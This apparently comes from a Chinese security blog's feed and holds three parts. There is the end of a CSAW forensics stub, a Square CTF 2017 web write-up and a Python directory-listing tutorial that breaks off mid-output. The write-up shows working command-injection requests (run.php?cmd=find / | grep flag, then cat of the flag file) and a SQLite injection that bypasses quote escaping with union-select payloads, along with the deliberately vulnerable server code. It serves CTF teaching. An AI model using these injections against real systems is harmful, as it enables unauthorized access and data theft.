<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Missed-Registration"><a href="#Missed-Registration" class="headerlink" title="Missed Registration"></a>Missed Registration</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">It&apos;s registration day! These forms just seem longer and longer...</div><div class="line">UPDATE 10:44 Eastern: New pcap that should be a bit easier to work with.</div><div class="line">UPDATE 2:58 Eastern: We&apos;re regenerating due to flag leaks, submissions disabled until then. Please be patient.</div><div class="line">Update 3:31 Eastern: Updated pcap with new flag after leak. Please re-run your solutions on the file!</div></pre></td></tr></table></figure>
<p>追踪TCP流看一下。</p>
<h2 id="Forensics-1"><a href="#Forensics-1" class="headerlink" title="Forensics"></a>Forensics</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Best Router</div><div class="line">http://forensics.chal.csaw.io:3287</div><div class="line">NOTE: This will expand to ~16GB!</div><div class="line">19:00 Eastern: updated. Old flags have been removed.</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;待续。&lt;br&gt;
    
    </summary>
    
      <category term="writeup:MISC" scheme="http://chybeta.github.io/categories/writeup-MISC/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="misc" scheme="http://chybeta.github.io/tags/misc/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>Square CTF 2017-Web-writeup</title>
    <link href="http://chybeta.github.io/2017/10/05/Square-CTF-2017-Web-writeup/"/>
    <id>http://chybeta.github.io/2017/10/05/Square-CTF-2017-Web-writeup/</id>
    <published>2017-10-05T12:01:19.000Z</published>
    <updated>2017-10-05T12:20:08.554Z</updated>
    
    <content type="html"><![CDATA[<p>Password checker： 代码执行<br>Little Doggy Tables： SQL注入<br><a id="more"></a></p>
<h1 id="Password-checker-50"><a href="#Password-checker-50" class="headerlink" title="Password checker 50"></a>Password checker 50</h1><h2 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://nybas-berog-bitev-fuhyn-fehyt.capturethesquare.com/</div></pre></td></tr></table></figure>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>查看源代码，发现有如下js：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params">objForm</span>) </span>&#123;</div><div class="line">  <span class="keyword">let</span> toBeCheckedValue = objForm.elements[<span class="string">'password'</span>].value;</div><div class="line"></div><div class="line">  <span class="keyword">let</span> xmlHttp = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">  xmlHttp.open(<span class="string">'GET'</span>, <span class="string">'/run.php?cmd=cat%20../password.txt'</span>, <span class="literal">false</span>);</div><div class="line">  xmlHttp.send(<span class="literal">null</span>);</div><div class="line">  <span class="keyword">let</span> actualValue = xmlHttp.responseText;</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (toBeCheckedValue != actualValue) &#123;</div><div class="line">    alert(<span class="string">'Passwords don\'t match!'</span>);</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    alert(<span class="string">'Password validated!'</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure></p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://nybas-berog-bitev-fuhyn-fehyt.capturethesquare.com//run.php?cmd=cat%20../password.txt</div></pre></td></tr></table></figure></p>
<p>得到密码：password123 ，输进去后只是弹出一个提示框。</p>
<p>考虑命令执行，尝试查找flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://nybas-berog-bitev-fuhyn-fehyt.capturethesquare.com/run.php?cmd=find / | grep flag</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171005/1.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://nybas-berog-bitev-fuhyn-fehyt.capturethesquare.com/run.php?cmd=cat /secrets/..109810_05_10_06_49_46.546032825/flag</div></pre></td></tr></table></figure>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag-tyzyd-gateh-lefif-girav-bobut</div></pre></td></tr></table></figure></p>
<p>另外读到run.php的源码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$line = exec($_GET[<span class="string">'cmd'</span>]);</div><div class="line"><span class="keyword">echo</span> $line;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<h1 id="Little-Doggy-Tables-100"><a href="#Little-Doggy-Tables-100" class="headerlink" title="Little Doggy Tables 100"></a>Little Doggy Tables 100</h1><h2 id="Task-1"><a href="#Task-1" class="headerlink" title="Task"></a>Task</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&quot;Oh, so you found it. Yes, it will tell you if a given agent is a dog or a cat, by looking up the appropriate value in its SQLite database. Good luck with that.</div><div class="line"></div><div class="line">&quot;Sure, the database contains some sensitive information, but our bulletproof firewall and top-notch quote escaping will ensure it never sees the light of day.</div><div class="line"></div><div class="line">&quot;Not secure? Huh? You don’t believe me? I’ll show you how secure. Here’s the source!&quot;</div><div class="line"></div><div class="line">USAGE EXAMPLE:</div><div class="line"></div><div class="line">curl &quot;https://little-doggy-tables.capturethesquare.com/agent_lookup&quot; --get --data-urlencode &quot;codename=Fido&quot;</div><div class="line">https://little-doggy-tables.capturethesquare.com</div></pre></td></tr></table></figure>
<h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>源码如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="comment"># author: Will McChesney &lt;wmcc<span class="doctag">@squareup</span>.com&gt;</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">"sqlite3"</span></div><div class="line"><span class="keyword">require</span> <span class="string">"webrick"</span></div><div class="line"></div><div class="line">PORT = ARGV[<span class="number">0</span>]</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecureDatastore</span></span></div><div class="line">  <span class="keyword">include</span> Singleton</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span></span></div><div class="line">    @db = SQLite3::Database.new(<span class="string">"secure.db"</span>)</div><div class="line">  <span class="keyword">end</span></div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">def</span> <span class="title">secure_species_lookup</span><span class="params">(insecure_codename)</span></span></div><div class="line">    <span class="comment"># roll our own escaping to prevent SQL injection attacks</span></div><div class="line">    secure_codename = insecure_codename.gsub(<span class="string">"'"</span>, Regexp.escape(<span class="string">"\\'"</span>))</div><div class="line">    query = <span class="string">"SELECT species FROM operatives WHERE codename = '<span class="subst">#&#123;secure_codename&#125;</span>';"</span></div><div class="line"></div><div class="line">    puts query</div><div class="line">    results = @db.execute(query)</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="keyword">if</span> results.length == <span class="number">0</span></div><div class="line">    results[<span class="number">0</span>][<span class="number">0</span>]</div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">server = WEBrick::HTTPServer.new(<span class="symbol">Port:</span> PORT)</div><div class="line"></div><div class="line">trap(<span class="string">"INT"</span>) &#123; server.shutdown &#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">AgentLookupServlet</span> &lt; WEBrick::HTTPServlet::<span class="title">AbstractServlet</span></span></div><div class="line">  <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(request, response)</span></span></div><div class="line">    response.status = <span class="number">200</span></div><div class="line">    response[<span class="string">"Content-Type"</span>] = <span class="string">"text/plain"</span></div><div class="line"></div><div class="line">    response.body = SecureDatastore.instance.secure_species_lookup(request.query[<span class="string">"codename"</span>]) + <span class="string">"\n"</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">server.mount <span class="string">"/agent_lookup"</span>, AgentLookupServlet</div><div class="line"></div><div class="line">server.start</div></pre></td></tr></table></figure></p>
<p>从题目的一大段描述，以及给出的源码来看应该是考察SQLite3注入。<br>关键在于下面这两句代码：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">secure_codename = insecure_codename.gsub(<span class="string">"'"</span>, Regexp.escape(<span class="string">"\\'"</span>))</div><div class="line">query = <span class="string">"SELECT species FROM operatives WHERE codename = '<span class="subst">#&#123;secure_codename&#125;</span>';"</span></div></pre></td></tr></table></figure></p>
<p>会将单引号<code>&#39;</code> 通过正则替换成<code>\&#39;</code>进行转义，来阻止我们闭合。但如果我们传入<code>\&#39;</code>，则在通过正则替换后会变成<code>\\&#39;</code>，其中第二个’\’是正则添加的，配合我们传入的<code>\</code>，会被转义，从而使我们的单引号逃逸。</p>
<p>在sqlite中，注释符为<code>--</code>，尝试访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://little-doggy-tables.capturethesquare.com/agent_lookup?codename=\&apos; or 1=1 --</div></pre></td></tr></table></figure></p>
<p>则服务器端执行的数据库查询语句如下，注意<code>\\</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT species FROM operatives WHERE codename = &apos;\\&apos; or 1=1 --&apos;;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171005/2.png?raw=true" alt=""></p>
<p>单引号逃逸成功。</p>
<p>接下去考虑如何注出数据。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://little-doggy-tables.capturethesquare.com/agent_lookup?codename=\&apos;  union select sql from sqlite_master  limit 0,1--</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171005/4.png?raw=true" alt=""></p>
<p>说明operatives表里有三个字段：codename，species，secret 。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">https://little-doggy-tables.capturethesquare.com/agent_lookup</div><div class="line">?codename=\&apos;  union select secret  from operatives   limit 0,1--</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171005/3.png?raw=true" alt=""></p>
<p>直接提交不对。。。后面发现应该要改变limit。最后payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">https://little-doggy-tables.capturethesquare.com/agent_lookup</div><div class="line">?codename=\&apos;  union select secret  from operatives   limit 9,1--</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171005/5.png?raw=true" alt=""></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag-a3db5c13ff90a36963278c6a39e4ee3c22e2a436</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Password checker： 代码执行&lt;br&gt;Little Doggy Tables： SQL注入&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Python中列目录相关函数/模块</title>
    <link href="http://chybeta.github.io/2017/10/04/Python%E4%B8%AD%E5%88%97%E7%9B%AE%E5%BD%95%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0-%E6%A8%A1%E5%9D%97/"/>
    <id>http://chybeta.github.io/2017/10/04/Python中列目录相关函数-模块/</id>
    <published>2017-10-04T10:25:40.000Z</published>
    <updated>2017-10-05T05:15:55.107Z</updated>
    
    <content type="html"><![CDATA[<p>测试环境：python 3.6.1  python 2.7.2<br>测试目录：<a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="external">cmspoc</a><br><a id="more"></a></p>
<h1 id="os"><a href="#os" class="headerlink" title="os"></a>os</h1><h2 id="os-listdir"><a href="#os-listdir" class="headerlink" title="os.listdir"></a>os.listdir</h2><p>语法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">os.listdir(path)</div></pre></td></tr></table></figure></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python 3.6.1  python 2.7.2</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>os.listdir(<span class="string">"./"</span>)</div><div class="line">[<span class="string">'.ftpconfig'</span>, <span class="string">'.git'</span>, <span class="string">'.gitignore'</span>, <span class="string">'cmspoc.py'</span>, <span class="string">'data'</span>, <span class="string">'lib'</span>, <span class="string">'README.md'</span>, <span class="string">'scripts'</span>, <span class="string">'tty.gif'</span>, <span class="string">'ttyrecord'</span>]</div></pre></td></tr></table></figure>
<p>可以以列表（list）列出当前目录下的文件夹及其文件，但没有区分开。同时注意并没有把特殊目录<code>../</code>，<code>./</code>作为结果返回。</p>
<p>可以利用os.path.isfile来判断是否为文件：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python 3.6.1  python 2.7.2</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>[ i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">"./"</span>) <span class="keyword">if</span> os.path.isfile(i)]</div><div class="line">[<span class="string">'.ftpconfig'</span>, <span class="string">'.gitignore'</span>, <span class="string">'cmspoc.py'</span>, <span class="string">'README.md'</span>, <span class="string">'tty.gif'</span>, <span class="string">'ttyrecord'</span>]</div></pre></td></tr></table></figure></p>
<p>可以利用os.path.isdir来判断是否为文件夹：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python 3.6.1  python 2.7.2</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>[ i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">"./"</span>) <span class="keyword">if</span> os.path.isdir(i)]</div><div class="line">[<span class="string">'.git'</span>, <span class="string">'data'</span>, <span class="string">'lib'</span>, <span class="string">'scripts'</span>]</div></pre></td></tr></table></figure></p>
<p>也可以用来查找指定结尾（不一定是后缀）的文件:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>[i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">"./"</span>) <span class="keyword">if</span> i.endswith(<span class="string">"d"</span>)]</div><div class="line">[<span class="string">'README.md'</span>, <span class="string">'ttyrecord'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>[i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">"./"</span>) <span class="keyword">if</span> i.endswith(<span class="string">".py"</span>)]</div><div class="line">[<span class="string">'cmspoc.py'</span>]</div></pre></td></tr></table></figure></p>
<h2 id="os-walk"><a href="#os-walk" class="headerlink" title="os.walk"></a>os.walk</h2><p>语法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">os.walk(top, topdown=True, onerror=None, followlinks=False)</div></pre></td></tr></table></figure></p>
<p>os.walk可以进行文件遍历。它接受四个参数，但绝大部分情况下直接传入一个路径就可。它的返回值一个三元组(dirpath, dirnames, filenames)。dirpath是指当前目录路径，dirnames是当前目录下所有子目录的名字（包括<code>.</code>和<code>..</code>），filenames是指dirpath中的文件（即非文件夹）。</p>
<p>假设此时的目录在cmspoc的script目录中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">λ tree /F</div><div class="line">卷 新加卷 的文件夹 PATH 列表</div><div class="line">卷序列号为 000000DE 0CBE:322D</div><div class="line">E:.</div><div class="line">│  __init__.py</div><div class="line">│</div><div class="line">├─icms</div><div class="line">│      v701_sqlinject_getadmin.py</div><div class="line">│      __init__.py</div><div class="line">│</div><div class="line">└─phpcms</div><div class="line">        v960_fileupload_getshell.py</div><div class="line">        v960_sqlinject_getpasswd.py</div><div class="line">        __init__.py</div></pre></td></tr></table></figure></p>
<p>则用for循环即可完成遍历：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python 3.6.1  python 2.7.2</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> root, dirnames, filenames <span class="keyword">in</span> os.walk(<span class="string">'./'</span>):</div><div class="line"><span class="meta">... </span>    print(root,dirnames,filenames)</div><div class="line">...</div><div class="line">./ [<span class="string">'icms'</span>, <span class="string">'phpcms'</span>] [<span class="string">'__init__.py'</span>]</div><div class="line">./icms [] [<span class="string">'v701_sqlinject_getadmin.py'</span>, <span class="string">'__init__.py'</span>]</div><div class="line">./phpcms [] [<span class="string">'v960_fileupload_getshell.py'</span>, <span class="string">'v960_sqlinject_getpasswd.py'</span>, <span class="string">'__init__.py'</span>]</div></pre></td></tr></table></figure></p>
<p>基于for循环遍历提取/过滤文件：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python 3.6.1  python 2.7.2</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> root, dirnames, filenames <span class="keyword">in</span> os.walk(<span class="string">'./'</span>):</div><div class="line"><span class="meta">... </span>    <span class="keyword">for</span> f <span class="keyword">in</span> filenames :</div><div class="line"><span class="meta">... </span>            <span class="keyword">if</span> f.endswith(<span class="string">".py"</span>):</div><div class="line"><span class="meta">... </span>                    print(os.path.join(root,f))</div><div class="line">...</div><div class="line">./__init__.py</div><div class="line">./icms/v701_sqlinject_getadmin.py</div><div class="line">./icms/__init__.py</div><div class="line">./phpcms/v960_fileupload_getshell.py</div><div class="line">./phpcms/v960_sqlinject_getpasswd.py</div><div class="line">./phpcms/__init__.py</div></pre></td></tr></table></figure></p>
<h2 id="os-scandir"><a href="#os-scandir" class="headerlink" title="os.scandir"></a>os.scandir</h2><p>从python3.5版本后有os.scandir()，能更快的遍历目录。更多介绍：<a href="https://www.python.org/dev/peps/pep-0471/" target="_blank" rel="external">os.scandir() function</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python 3.6.1</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> f <span class="keyword">in</span> os.scandir():</div><div class="line"><span class="meta">... </span>    print(f)          </div><div class="line"><span class="meta">... </span>                      </div><div class="line">&lt;DirEntry <span class="string">'.ftpconfig'</span>&gt;   </div><div class="line">&lt;DirEntry <span class="string">'.git'</span>&gt;         </div><div class="line">&lt;DirEntry <span class="string">'.gitignore'</span>&gt;   </div><div class="line">&lt;DirEntry <span class="string">'cmspoc.py'</span>&gt;    </div><div class="line">&lt;DirEntry <span class="string">'data'</span>&gt;         </div><div class="line">&lt;DirEntry <span class="string">'lib'</span>&gt;          </div><div class="line">&lt;DirEntry <span class="string">'README.md'</span>&gt;    </div><div class="line">&lt;DirEntry <span class="string">'scripts'</span>&gt;</div></pre></td></tr></table></figure>
<p>可以看到返回的是<code>DirEntry</code>对象，下面列一些简单的属性与方法。</p>
<p>仅打印出名字（<code>name</code>属性）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># python 3.6.1</div><div class="line">&gt;&gt;&gt; [f.name for f in os.scandir()]                    </div><div class="line">[&apos;.ftpconfig&apos;, &apos;.git&apos;, &apos;.gitignore&apos;, &apos;cmspoc.py&apos;, &apos;data&apos;, &apos;lib&apos;, &apos;README.md&apos;, &apos;scripts&apos;,&apos;tty.gif&apos;, &apos;ttyrecord&apos;]</div></pre></td></tr></table></figure></p>
<p>判断是否为文件：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python 3.6.1</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>[f.name <span class="keyword">for</span> f <span class="keyword">in</span> os.scandir() <span class="keyword">if</span> f.is_file()]</div><div class="line">[<span class="string">'.ftpconfig'</span>, <span class="string">'.gitignore'</span>, <span class="string">'cmspoc.py'</span>, <span class="string">'README.md'</span>, <span class="string">'tty.gif'</span>, <span class="string">'ttyrecord'</span>]</div></pre></td></tr></table></figure></p>
<p>判断是否为文件夹：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python 3.6.1</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>[f.name <span class="keyword">for</span> f <span class="keyword">in</span> os.scandir() <span class="keyword">if</span> f.is_dir()]</div><div class="line">[<span class="string">'.git'</span>, <span class="string">'data'</span>, <span class="string">'lib'</span>, <span class="string">'scripts'</span>]</div></pre></td></tr></table></figure></p>
<h1 id="glob"><a href="#glob" class="headerlink" title="glob"></a>glob</h1><p>确切的说，glob模块不是来列目录的，是用来查找给定规则的文件路径名。查询所需的字符（规则）有三个：</p>
<ol>
<li><code>*</code> 表示通配符，匹配零个或多个字符。</li>
<li><code>?</code> 匹配一个字符。</li>
<li><code>[]</code> 匹配指定范围内的字符。</li>
</ol>
<p>相关文档见这：<a href="https://docs.python.org/2.7/library/glob.html" target="_blank" rel="external">python2.7</a>，<a href="https://docs.python.org/3.6/library/glob.html" target="_blank" rel="external">python3.6</a></p>
<h2 id="glob-glob"><a href="#glob-glob" class="headerlink" title="glob.glob"></a>glob.glob</h2><p>语法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">glob.glob(pathname)</div></pre></td></tr></table></figure></p>
<p>可以使用绝对路径，配合<code>*</code>列出指定目录下所有文件：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python 3.6.1  python 2.7.2</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> glob</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>glob.glob(<span class="string">r"E:\cmsPoc\*"</span>)</div><div class="line">[<span class="string">'E:\\cmsPoc\\cmspoc.py'</span>, <span class="string">'E:\\cmsPoc\\data'</span>, <span class="string">'E:\\cmsPoc\\lib'</span>, <span class="string">'E:\\cmsPoc\\README.md'</span>, <span class="string">'E:\\cmsPoc\\scripts'</span>, <span class="string">'E:\\cmsPoc\\tty.gif'</span>, <span class="string">'E:\\cmsPoc\\ttyrecord'</span>]</div></pre></td></tr></table></figure></p>
<p>也可以使用相对路径：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python 3.6.1  python 2.7.2</span></div><div class="line"><span class="comment"># use *</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>glob.glob(<span class="string">r"*"</span>)</div><div class="line">[<span class="string">'cmspoc.py'</span>, <span class="string">'data'</span>, <span class="string">'lib'</span>, <span class="string">'README.md'</span>, <span class="string">'scripts'</span>, <span class="string">'tty.gif'</span>, <span class="string">'ttyrecord'</span>]</div><div class="line"></div><div class="line"><span class="comment"># user ./*</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>glob.glob(<span class="string">r"./*"</span>)</div><div class="line">[<span class="string">'.\\cmspoc.py'</span>, <span class="string">'.\\data'</span>, <span class="string">'.\\lib'</span>, <span class="string">'.\\README.md'</span>, <span class="string">'.\\scripts'</span>, <span class="string">'.\\tty.gif'</span>, <span class="string">'.\\ttyrecord'</span>]</div></pre></td></tr></table></figure></p>
<p>可以查找满足符合规则的文件，比如查找py文件：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python 3.6.1  python 2.7.2</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>glob.glob(<span class="string">r"*.py"</span>)</div><div class="line">[<span class="string">'cmspoc.py'</span>]</div></pre></td></tr></table></figure></p>
<p>在python3.5以上，glob.glob支持特殊通配符<code>**</code>和递归（recursive ）操作，：</p>
<p>比如列出当前目录下所有的py文件：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>glob.glob(<span class="string">r"./**/*.py"</span>,recursive=<span class="keyword">True</span>)</div><div class="line">[<span class="string">'.\\cmspoc.py'</span>, <span class="string">'.\\lib\\__init__.py'</span>, <span class="string">'.\\lib\\controllor\\controllor.py'</span>, <span class="string">'.\\lib\\controllor\\__init__.py'</span>, <span class="string">'.\\lib\\core\\common.py'</span>, <span class="string">'.\\lib\\core\\data.py'</span>, <span class="string">'.\\lib\\core\\datatype.py'</span>, <span class="string">'.\\lib\\core\\setting.py'</span>, <span class="string">'.\\lib\\core\\__init__.py'</span>, <span class="string">'.\\lib\\parse\\cmdline.py'</span>, <span class="string">'.\\lib\\parse\\__init__.py'</span>, <span class="string">'.\\lib\\plugin\\__init__.py'</span>, <span class="string">'.\\lib\\plugin\\crypto\\authcode.py'</span>, <span class="string">'.\\lib\\plugin\\crypto\\__init__.py'</span>, <span class="string">'.\\scripts\\__init__.py'</span>, <span class="string">'.\\scripts\\icms\\v701_sqlinject_getadmin.py'</span>, <span class="string">'.\\scripts\\icms\\__init__.py'</span>, <span 